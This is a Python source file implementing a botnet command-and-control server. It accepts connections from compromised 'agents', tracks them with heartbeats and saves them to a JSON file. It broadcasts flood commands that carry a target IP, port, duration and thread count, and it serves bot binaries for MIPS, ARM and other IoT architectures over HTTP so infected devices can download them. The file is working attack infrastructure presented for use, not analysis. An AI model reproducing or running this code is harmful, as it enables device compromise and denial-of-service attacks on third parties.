import json
import os
import socket
import threading
import time
import uuid
import urllib.parse

AGENTS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agents.json")
AGENT_TIMEOUT = 300
HEARTBEAT_INTERVAL = 20

_BOT_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "core", "bot")

class C2Server:
    def __init__(self, host="0.0.0.0", port=9001, auto_cascade=False):
        self.host = host
        self.port = port
        self.auto_cascade = auto_cascade
        self.agents = {}
        self.agents_lock = threading.Lock()
        self.sock = None
        self.running = False
        self._load_agents()

    def _load_agents(self):
        try:
            if os.path.exists(AGENTS_FILE):
                with open(AGENTS_FILE, "r") as f:
                    data = json.load(f)
                    if isinstance(data, dict):
                        self.agents = data
                        for aid in self.agents:
                            self.agents[aid]["connected"] = False
                            self.agents[aid].pop("conn", None)
        except Exception:
            self.agents = {}

    def _save_agents(self):
        try:
            with self.agents_lock:
                save_data = {k: {kk: vv for kk, vv in v.items() if kk != "conn"} for k, v in self.agents.items()}
            with open(AGENTS_FILE, "w") as f:
                json.dump(save_data, f, indent=2)
        except Exception:
            pass

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(50)
        self.sock.settimeout(1.0)
        self.running = True
        print(f"[+] C2Server + HTTP file server listening on {self.host}:{self.port}")

        hb_thread = threading.Thread(target=self._heartbeat_check, daemon=True)
        hb_thread.start()

        while self.running:
            try:
                conn, addr = self.sock.accept()
                conn.settimeout(30)
                threading.Thread(target=self._handle_connection, args=(conn, addr), daemon=True).start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _serve_http(self, conn, first_data):
        """Serve bot binary files over HTTP on the same port as JSON protocol."""
        try:
            header_end = first_data.find(b"\r\n\r\n")
            if header_end == -1:
                return
            request_line = first_data[:header_end].split(b"\r\n")[0].decode("utf-8", errors="ignore")
            parts = request_line.split(" ")
            if len(parts) < 2:
                return
            method, path = parts[0], parts[1]
            path = path.split("?")[0]
            path = urllib.parse.unquote(path)

            if path.startswith("/agent"):
                arch = path.replace("/agent", "", 1).lstrip("/")
                arch_map = {
                    "mipsel": "mipsle",
                    "mips": "mips",
                    "arm": "arm",
                    "armv7l": "armv7l",
                    "x86": "x86",
                    "386": "x86",
                    "x86_64": "x86_64",
                    "amd64": "x86_64",
                    "arm64": "arm64",
                    "sh4": "sh4",
                    "powerpc": "powerpc",
                }
                binary_arch = arch_map.get(arch, arch)
                # Map Go binary names to arch names
                file_map = {
                    "x86": "x86",
                    "x86_64": "x86_64",
                    "arm64": "arm64",
                    "mips": "mips",
                    "mipsle": "mipsle",
                    "arm": "arm",
                    "armv7l": "armv7l",
                    "sh4": "sh4",
                    "powerpc": "powerpc",
                }
                # Go binaries use different names (386, amd64)
                go_map = {"x86": "386", "x86_64": "amd64"}
                file_arch = go_map.get(binary_arch, binary_arch)
                candidates = [f"bot-{file_arch}", f"bot-{binary_arch}"]
                if not path.strip("/"):
                    candidates = ["bot-mipsle"] + candidates
                candidates.append("bot-mipsle")
                candidates.append("bot-mips")
                candidates.append("bot-arm")

                for name in candidates:
                    bot_path = os.path.join(_BOT_DIR, name)
                    if os.path.exists(bot_path):
                        try:
                            with open(bot_path, "rb") as f:
                                content = f.read()
                            header = (
                                "HTTP/1.1 200 OK\r\n"
                                "Content-Type: application/octet-stream\r\n"
                                f"Content-Length: {len(content)}\r\n"
                                "Connection: close\r\n\r\n"
                            ).encode()
                            conn.sendall(header + content)
                            return
                        except Exception:
                            pass
                conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
            else:
                conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
        except Exception:
            pass

    def _handle_connection(self, conn, addr):
        """Route connections: HTTP requests get file serving, JSON gets agent protocol."""
        agent_id = None
        try:
            data = b""
            conn.settimeout(10)
            while b"\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    return
                data += chunk
                if len(data) > 1024 * 1024:
                    return

            # Detect HTTP request
            first_line = data.split(b"\n", 1)[0].upper()
            if first_line.startswith(b"GET ") or first_line.startswith(b"POST ") or first_line.startswith(b"HEAD "):
                self._serve_http(conn, data)
                return

            # JSON agent protocol
            line, _ = data.split(b"\n", 1)
            try:
                msg = json.loads(line.decode("utf-8", errors="ignore"))
            except json.JSONDecodeError as e:
                print(f"[!] Invalid JSON from {addr[0]}: {e} | data: {line[:100]}", flush=True)
                return

            if msg.get("type") == "register":
                agent_id = msg.get("agent_id", str(uuid.uuid4())[:8])
                print(f"[+] Agent registered: {agent_id} from {addr[0]} arch={msg.get('arch','?')}", flush=True)
                with self.agents_lock:
                    self.agents[agent_id] = {
                        "id": agent_id,
                        "hostname": msg.get("hostname", "unknown"),
                        "ip": msg.get("ip", addr[0]),
                        "platform": msg.get("platform", "unknown"),
                        "arch": msg.get("arch", "unknown"),
                        "version": msg.get("version", "unknown"),
                        "last_seen": time.time(),
                        "connected": True,
                        "conn": conn,
                        "addr": str(addr),
                    }
                self._save_agents()

            conn.settimeout(HEARTBEAT_INTERVAL + 30)
            while True:
                try:
                    data = b""
                    while b"\n" not in data:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if len(data) > 1024 * 1024:
                            break

                    if b"\n" not in data:
                        break

                    line, _ = data.split(b"\n", 1)
                    if not line:
                        continue

                    msg = json.loads(line.decode("utf-8", errors="ignore"))
                    msg_type = msg.get("type", "")

                    if msg_type == "heartbeat":
                        if agent_id and agent_id in self.agents:
                            self.agents[agent_id]["last_seen"] = time.time()
                            self.agents[agent_id]["connected"] = True

                    elif msg_type == "pong":
                        if agent_id and agent_id in self.agents:
                            self.agents[agent_id]["last_seen"] = time.time()
                            self.agents[agent_id]["connected"] = True

                    elif msg_type == "result":
                        pass

                    elif msg_type == "command":
                        pass

                    conn.settimeout(HEARTBEAT_INTERVAL + 30)
                except socket.timeout:
                    break
                except Exception:
                    break
        except Exception:
            pass
        finally:
            if agent_id:
                with self.agents_lock:
                    if agent_id in self.agents:
                        self.agents[agent_id]["connected"] = False
            try:
                conn.close()
            except Exception:
                pass

    def _heartbeat_check(self):
        while self.running:
            time.sleep(HEARTBEAT_INTERVAL)
            now = time.time()
            dead_agents = []
            with self.agents_lock:
                for agent_id, info in list(self.agents.items()):
                    if now - info.get("last_seen", 0) > AGENT_TIMEOUT:
                        info["connected"] = False
                        dead_agents.append(agent_id)
                    elif info.get("connected") and info.get("conn"):
                        try:
                            info["conn"].sendall(
                                json.dumps({"type": "heartbeat"}).encode("utf-8") + b"\n"
                            )
                        except Exception:
                            info["connected"] = False
                            dead_agents.append(agent_id)

    def _send_to_agent(self, agent_id, msg):
        with self.agents_lock:
            agent = self.agents.get(agent_id)
            if not agent or not agent.get("connected"):
                return False
            conn = agent.get("conn")
            if not conn:
                return False
            try:
                data = json.dumps(msg).encode("utf-8") + b"\n"
                conn.sendall(data)
                return True
            except Exception:
                agent["connected"] = False
                return False

    def broadcast(self, command):
        targets = []
        with self.agents_lock:
            for agent_id, info in list(self.agents.items()):
                if info.get("connected"):
                    cmd = dict(command)
                    cmd_id = cmd.get("id", str(uuid.uuid4())[:8])
                    cmd["id"] = cmd_id
                    cmd["type"] = "command"

                    inner = cmd.get("command", {})
                    if isinstance(inner, dict):
                        cmd["command_type"] = inner.get("command_type") or inner.get("type", "unknown")
                        cmd["flood_type"] = inner.get("flood_type", "")
                        cmd["target_ip"] = inner.get("target_ip", "")
                        cmd["target_port"] = inner.get("target_port", 0)
                        cmd["duration"] = inner.get("duration", 60)
                        cmd["threads"] = inner.get("threads", 2000)
                        cmd["command"] = inner.get("command", "")
                        cmd["ports"] = inner.get("ports", [])
                    else:
                        cmd["command_type"] = str(inner)
                        cmd["command"] = ""

                    sent = self._send_to_agent(agent_id, cmd)
                    if sent:
                        targets.append(agent_id)
        return targets

    def send_command(self, target_id, command):
        return self._send_to_agent(target_id, command)

    def list_agents(self):
        with self.agents_lock:
            return {k: {kk: vv for kk, vv in v.items() if kk != "conn"} for k, v in self.agents.items()}

    def get_active_agents(self):
        with self.agents_lock:
            return [k for k, v in self.agents.items() if v.get("connected")]

    def stop(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
